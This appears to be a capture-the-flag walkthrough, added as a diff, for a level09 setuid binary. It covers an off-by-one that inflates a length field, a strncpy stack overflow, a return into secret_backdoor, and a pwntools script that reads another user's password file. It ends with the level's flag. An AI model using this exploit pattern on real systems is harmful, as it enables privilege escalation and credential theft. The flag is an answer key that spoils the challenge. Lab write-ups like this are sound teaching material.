@@ -1,0 +1,135 @@
+# Level 09 Walkthrough - Struct Field Off-by-One -> strncpy Overflow -> secret_backdoor
+
+## 1.1 SSH into VM
+```
+sshpass -p `cat level08/flag` ssh -o StrictHostKeyChecking=no level09@localhost -p 4242
+```
+
+## Binary Overview
+
+64-bit PIE, setuid **end**/users, no stack canary.
+
+Functions of interest:
+- `handle_msg`    - allocates the `t_msg` struct on the stack, calls set_username then set_msg
+- `set_username`  - reads username into `msg->username` (40 bytes)
+- `set_msg`       - reads message and calls `strncpy(msg, buf, msg->msg_len)`
+- `secret_backdoor` - never called directly; reads from stdin and calls `system()`
+
+## Struct Layout (192 = 0xc0 bytes, on handle_msg's stack)
+
+```
+offset  field        size   notes
+0x000   msg          140    message body; strncpy destination
+0x08c   username      40    written by set_username
+0x0b4   msg_len        4    strncpy length; initialised to 140 (0x8c)
+0x0b8   _pad           8
+------                192 = 0xc0
+```
+
+Saved rbp and return address of handle_msg sit immediately above the struct:
+
+```
+struct_ptr + 0xc0  -> saved rbp   (handle_msg's frame)
+struct_ptr + 0xc8  -> return addr (-> main+0x15)
+```
+
+## Vulnerability 1 - set_username Off-by-One
+
+The copy loop in `set_username` runs while `i <= 40` (not `i < 40`):
+
+```c
+for (i = 0; i <= 40 && buf[i]; i++)
+    msg->username[i] = buf[i];
+```
+
+`msg->username` is 40 bytes (indices 0-39). Index 40 is **one past the end**,
+landing at `msg->msg_len`'s low byte (`struct_ptr + 0xb4`).
+
+`msg_len` starts as `0x0000008c` (140).  Sending 41 non-null bytes overwrites
+the low byte, changing it to whatever byte we choose.
+
+## Vulnerability 2 - set_msg Unbounded strncpy
+
+```c
+strncpy((char *)msg, buf, msg->msg_len);
+```
+
+After inflating `msg_len` to **0xff = 255**, strncpy copies 255 bytes starting
+at `msg` (offset 0 of the struct).  The struct is only 192 bytes, so bytes
+193-255 overflow into saved rbp and the return address of `handle_msg`.
+
+Return address offset: `struct_ptr + 0xc8` -> byte index **200** in the
+strncpy payload.
+
+## secret_backdoor
+
+```c
+void secret_backdoor(void) {
+    char cmd[128];
+    fgets(cmd, 128, stdin);
+    system(cmd);   // runs as effective user 'end' (setuid)
+}
+```
+
+PIE base (ASLR disabled): `0x555555554000`
+Offset of secret_backdoor: `0x88c`
+Absolute address: `0x55555555488c`
+
+## Exploit Steps
+
+### Step 1 - inflate msg_len
+Send 40 padding bytes + `\xff` as username:
+
+```
+b"A" * 40 + b"\xff"
+```
+
+`msg->msg_len` low byte becomes `0xff` -> `msg_len = 255`.
+
+### Step 2 - overwrite return address via strncpy
+Craft message payload (208 bytes):
+
+```
+b"A" * 0xc0          # fill struct (192 bytes)
++ b"B" * 8           # overwrite saved rbp (value irrelevant)
++ p64(0x55555555488c) # overwrite return address -> secret_backdoor
+```
+
+strncpy copies the first 206 non-null bytes as-is; then encounters `\x00`
+at index 206 (first null byte of the 64-bit address) and pads the rest with
+nulls — which are exactly the correct high bytes of the address.
+
+### Step 3 - send shell command
+After `handle_msg` returns into `secret_backdoor`, it calls
+`fgets(cmd, 128, stdin)` and passes the input directly to `system()`:
+
+```
+cat /home/users/end/.pass
+```
+
+## One-liner (Python / pwntools)
+
+```python
+from pwn import ssh, p64
+
+PIE_BASE = 0x555555554000
+BACKDOOR = PIE_BASE + 0x88c
+
+s = ssh(host="localhost", port=4242, user="level09", password="<pass>")
+p = s.run("/home/users/level09/level09")
+
+p.recvuntil(b">>: ")
+p.sendline(b"A" * 40 + b"\xff")          # inflate msg_len to 255
+
+p.recvuntil(b">>: ")
+payload = b"A" * 0xc0 + b"B" * 8 + p64(BACKDOOR)
+p.sendline(payload)                       # overflow return address
+
+p.recvuntil(b"Msg sent!")
+p.sendline(b"cat /home/users/end/.pass")  # system() runs this
+print(p.recvrepeat(timeout=3))
+```
+
+## Flag
+
+`j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE`
